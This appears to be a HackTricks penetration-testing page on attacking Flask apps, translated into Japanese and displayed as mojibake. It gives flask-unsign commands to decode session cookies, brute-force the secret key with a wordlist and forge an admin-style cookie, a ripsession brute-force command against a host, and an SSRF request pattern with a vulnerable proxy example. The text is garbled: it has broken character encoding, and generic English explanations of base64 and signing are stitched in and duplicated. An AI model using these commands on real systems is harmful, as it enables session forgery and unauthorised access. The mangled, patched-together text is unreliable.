# Flask

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ã—ã¦**è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**ãŠãã‚‰ãã€CTFã‚’ãƒ—ãƒ¬ã‚¤ã—ã¦ã„ã‚‹å ´åˆã€Flaskã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**ã«é–¢é€£ã—ã¦ã„ã‚‹ã§ã—ã‚‡ã†ã€‚**

## Cookies

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¯ãƒƒã‚­ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³åã¯**`session`**ã§ã™ã€‚

### ãƒ‡ã‚³ãƒ¼ãƒ€ãƒ¼

ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã®Flaskã‚¯ãƒƒã‚­ãƒ¼ãƒ‡ã‚³ãƒ¼ãƒ€ãƒ¼ï¼š[https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### æ‰‹å‹•

æœ€åˆã®ãƒ‰ãƒƒãƒˆã¾ã§ã®ã‚¯ãƒƒã‚­ãƒ¼ã®æœ€åˆã®éƒ¨åˆ†ã‚’å–å¾—ã—ã€Base64ã§ãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã¾ã™>
```bash
echo "ImhlbGxvIg" | base64 -d
```
ã‚¯ãƒƒã‚­ãƒ¼ã¯ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ç½²åã•ã‚Œã¦ã„ã¾ã™ã€‚

### **Flask-Unsign**

ç§˜å¯†ã®ã‚­ãƒ¼ã‚’æ¨æ¸¬ã—ã¦ã€Flaskã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ã‚’å–å¾—ã€ãƒ‡ã‚³ãƒ¼ãƒ‰ã€ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã€ãŠã‚ˆã³ä½œæˆã™ã‚‹ãŸã‚ã®ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **Cookieã®ãƒ‡ã‚³ãƒ¼ãƒ‰**

```plaintext
The first step in analyzing a web application is to understand how it handles user sessions. One common method is through the use of cookies. Cookies are small pieces of data that are stored on the user's browser and are sent back to the server with each request.

In some cases, the cookies may be encoded or encrypted to protect the data they contain. To analyze the contents of a cookie, you will need to decode it.

There are several tools and techniques available to decode cookies. One popular tool is the "base64" encoding scheme. Base64 is a binary-to-text encoding scheme that represents binary data in an ASCII string format.

To decode a cookie using base64, you can use online tools or command-line utilities. For example, you can use the following command in a Linux terminal:

```bash
echo -n "SGVsbG8gd29ybGQ=" | base64 -d
```

This command will decode the base64-encoded string "SGVsbG8gd29ybGQ=" and output the decoded value "Hello world".

By decoding a cookie, you can gain insight into the data it contains and potentially identify any vulnerabilities or security issues. It is an essential step in the process of web application penetration testing.
```

Cookieã®ãƒ‡ã‚³ãƒ¼ãƒ‰
----------------

ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è§£æã®æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®å‡¦ç†æ–¹æ³•ã‚’ç†è§£ã™ã‚‹ã“ã¨ã§ã™ã€‚ä¸€èˆ¬çš„ãªæ–¹æ³•ã®1ã¤ã¯ã€Cookieã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚Cookieã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«ä¿å­˜ã•ã‚Œã€å„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨å…±ã«ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã•ã‚Œã‚‹å°ã•ãªãƒ‡ãƒ¼ã‚¿ã®å¡Šã§ã™ã€‚

å ´åˆã«ã‚ˆã£ã¦ã¯ã€Cookieã«å«ã¾ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«ã€CookieãŒã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã¾ãŸã¯æš—å·åŒ–ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚Cookieã®å†…å®¹ã‚’è§£æã™ã‚‹ã«ã¯ã€ãã‚Œã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

Cookieã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã«ã¯ã€ã„ãã¤ã‹ã®ãƒ„ãƒ¼ãƒ«ã‚„æŠ€è¡“ãŒåˆ©ç”¨ã§ãã¾ã™ã€‚äººæ°—ã®ã‚ã‚‹ãƒ„ãƒ¼ãƒ«ã®1ã¤ã¯ã€"base64"ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚¹ã‚­ãƒ¼ãƒ ã§ã™ã€‚Base64ã¯ã€ãƒã‚¤ãƒŠãƒªãƒ‡ãƒ¼ã‚¿ã‚’ASCIIæ–‡å­—åˆ—å½¢å¼ã§è¡¨ç¾ã™ã‚‹ãƒã‚¤ãƒŠãƒªã‹ã‚‰ãƒ†ã‚­ã‚¹ãƒˆã¸ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚¹ã‚­ãƒ¼ãƒ ã§ã™ã€‚

base64ã‚’ä½¿ç”¨ã—ã¦Cookieã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹ã«ã¯ã€ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ãƒ„ãƒ¼ãƒ«ã‚„ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€Linuxã®ã‚¿ãƒ¼ãƒŸãƒŠãƒ«ã§æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

```bash
echo -n "SGVsbG8gd29ybGQ=" | base64 -d
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€base64ã§ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸæ–‡å­—åˆ— "SGVsbG8gd29ybGQ=" ã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã€ãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸå€¤ "Hello world" ã‚’å‡ºåŠ›ã—ã¾ã™ã€‚

Cookieã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§ã€ãã‚ŒãŒå«ã‚€ãƒ‡ãƒ¼ã‚¿ã‚’æŠŠæ¡ã—ã€æ½œåœ¨çš„ãªè„†å¼±æ€§ã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å•é¡Œã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã®ãƒ—ãƒ­ã‚»ã‚¹ã«ãŠã„ã¦é‡è¦ãªã‚¹ãƒ†ãƒƒãƒ—ã§ã™ã€‚
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒ**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **ç½²å**

Signing is a process used to verify the authenticity and integrity of data. In the context of web applications, signing is often used to ensure that data sent between the client and the server has not been tampered with.

In Flask, signing can be achieved using the `itsdangerous` library. This library provides a `Signer` class that can be used to sign and verify data.

To sign data in Flask, you first need to create a signer object by passing a secret key to the `Signer` class. The secret key should be a long and random string that is kept secret.

```python
from itsdangerous import Signer

secret_key = "mysecretkey"
signer = Signer(secret_key)
```

Once you have a signer object, you can use the `sign` method to sign data. The `sign` method takes a string as input and returns a signed string.

```python
data = "Hello, world!"
signed_data = signer.sign(data)
```

To verify the signed data, you can use the `unsign` method. The `unsign` method takes a signed string as input and returns the original data if the signature is valid. If the signature is invalid or the data has been tampered with, an exception will be raised.

```python
try:
    original_data = signer.unsign(signed_data)
    print(original_data)
except:
    print("Invalid signature")
```

By using signing in your Flask applications, you can ensure the integrity and authenticity of data transmitted between the client and the server. This can help prevent data tampering and unauthorized access to sensitive information.

#### **ç½²å**

ç½²åã¯ãƒ‡ãƒ¼ã‚¿ã®çœŸæ­£æ€§ã¨å®Œå…¨æ€§ã‚’æ¤œè¨¼ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã§ã™ã€‚Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ–‡è„ˆã§ã¯ã€ç½²åã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼é–“ã§é€ä¿¡ã•ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ãŒæ”¹ã–ã‚“ã•ã‚Œã¦ã„ãªã„ã“ã¨ã‚’ä¿è¨¼ã™ã‚‹ãŸã‚ã«ã‚ˆãä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

Flaskã§ã¯ã€`itsdangerous`ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ã¦ç½²åã‚’å®Ÿç¾ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯ã€ãƒ‡ãƒ¼ã‚¿ã®ç½²åã¨æ¤œè¨¼ã‚’è¡Œã†ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹`Signer`ã‚¯ãƒ©ã‚¹ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚

Flaskã§ãƒ‡ãƒ¼ã‚¿ã«ç½²åã™ã‚‹ã«ã¯ã€ã¾ãš`Signer`ã‚¯ãƒ©ã‚¹ã«ç§˜å¯†éµã‚’æ¸¡ã™ã“ã¨ã§ç½²åã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ç§˜å¯†éµã¯é•·ããƒ©ãƒ³ãƒ€ãƒ ãªæ–‡å­—åˆ—ã§ã‚ã‚Šã€ç§˜å¯†ã«ä¿æŒã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

```python
from itsdangerous import Signer

secret_key = "mysecretkey"
signer = Signer(secret_key)
```

ç½²åã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€`sign`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã«ç½²åã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚`sign`ãƒ¡ã‚½ãƒƒãƒ‰ã¯æ–‡å­—åˆ—ã‚’å…¥åŠ›ã¨ã—ã¦å—ã‘å–ã‚Šã€ç½²åã•ã‚ŒãŸæ–‡å­—åˆ—ã‚’è¿”ã—ã¾ã™ã€‚

```python
data = "Hello, world!"
signed_data = signer.sign(data)
```

ç½²åã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’æ¤œè¨¼ã™ã‚‹ã«ã¯ã€`unsign`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚`unsign`ãƒ¡ã‚½ãƒƒãƒ‰ã¯ç½²åã•ã‚ŒãŸæ–‡å­—åˆ—ã‚’å…¥åŠ›ã¨ã—ã¦å—ã‘å–ã‚Šã€ç½²åãŒæœ‰åŠ¹ã§ã‚ã‚Œã°å…ƒã®ãƒ‡ãƒ¼ã‚¿ã‚’è¿”ã—ã¾ã™ã€‚ç½²åãŒç„¡åŠ¹ã§ã‚ã‚‹ã‹ã€ãƒ‡ãƒ¼ã‚¿ãŒæ”¹ã–ã‚“ã•ã‚Œã¦ã„ã‚‹å ´åˆã¯ä¾‹å¤–ãŒç™ºç”Ÿã—ã¾ã™ã€‚

```python
try:
    original_data = signer.unsign(signed_data)
    print(original_data)
except:
    print("ç„¡åŠ¹ãªç½²åã§ã™")
```

Flaskã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ç½²åã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼é–“ã§é€ä¿¡ã•ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ã®å®Œå…¨æ€§ã¨çœŸæ­£æ€§ã‚’ä¿è¨¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ‡ãƒ¼ã‚¿ã®æ”¹ã–ã‚“ã‚„æ©Ÿå¯†æƒ…å ±ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### ãƒ¬ã‚¬ã‚·ãƒ¼ï¼ˆå¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼‰ã‚’ä½¿ç”¨ã—ãŸç½²å

Legacy versions of Flask, specifically versions 0.9 and earlier, use a different method for signing cookies compared to newer versions. This older method is considered less secure and should be avoided if possible.

To sign cookies using legacy versions of Flask, you can use the `itsdangerous` library. This library provides a `URLSafeSerializer` class that can be used to sign and verify cookies.

Here is an example of how to sign a cookie using the legacy method:

```python
from itsdangerous import URLSafeSerializer

# Create a serializer with a secret key
serializer = URLSafeSerializer('your_secret_key')

# Sign the cookie value
signed_value = serializer.dumps('cookie_value')

# Set the signed cookie in the response
response.set_cookie('cookie_name', signed_value)
```

To verify the signed cookie, you can use the `loads` method of the serializer:

```python
from itsdangerous import BadSignature

# Get the signed cookie value from the request
signed_value = request.cookies.get('cookie_name')

try:
    # Verify the signed cookie value
    cookie_value = serializer.loads(signed_value)
except BadSignature:
    # Handle invalid signature
    pass
```

It is recommended to upgrade to a newer version of Flask and use the updated signing method for improved security.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

flask-unsignã‚’ä½¿ç”¨ã—ã¦ä½œæˆã•ã‚ŒãŸã‚¯ãƒƒã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã®ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### Flaskã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ã®SQLiã¨SQLmap

[**ã“ã®ä¾‹**](../../pentesting-web/sql-injection/sqlmap/#eval)ã§ã¯ã€æ—¢çŸ¥ã®ç§˜å¯†ã‚’ä½¿ç”¨ã—ã¦ã€sqlmapã®`eval`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦Flaskã«å¯¾ã—ã¦è‡ªå‹•çš„ã«sqlmapãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã«ç½²åã—ã¾ã™ã€‚

## Flaskãƒ—ãƒ­ã‚­ã‚·ã‚’ä½¿ç”¨ã—ãŸSSRF

[**ã“ã®è§£èª¬è¨˜äº‹**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)ã§ã¯ã€FlaskãŒã€Œ@ã€æ–‡å­—ã§å§‹ã¾ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¨±å¯ã™ã‚‹æ–¹æ³•ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
æ¬¡ã®ã‚·ãƒŠãƒªã‚ªã®ä¸­ã§ã€ã©ã‚ŒãŒå½“ã¦ã¯ã¾ã‚Šã¾ã™ã‹ï¼Ÿ
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
"@attacker.com"ã®ã‚ˆã†ãªã‚‚ã®ã‚’å°å…¥ã™ã‚‹ã“ã¨ã§ã€**SSRF**ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚å…ˆé€²çš„ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼**ã‚’ç°¡å˜ã«æ§‹ç¯‰ã—ã€è‡ªå‹•åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ã—ã¦ãã ã•ã„ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ã”è¦§ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
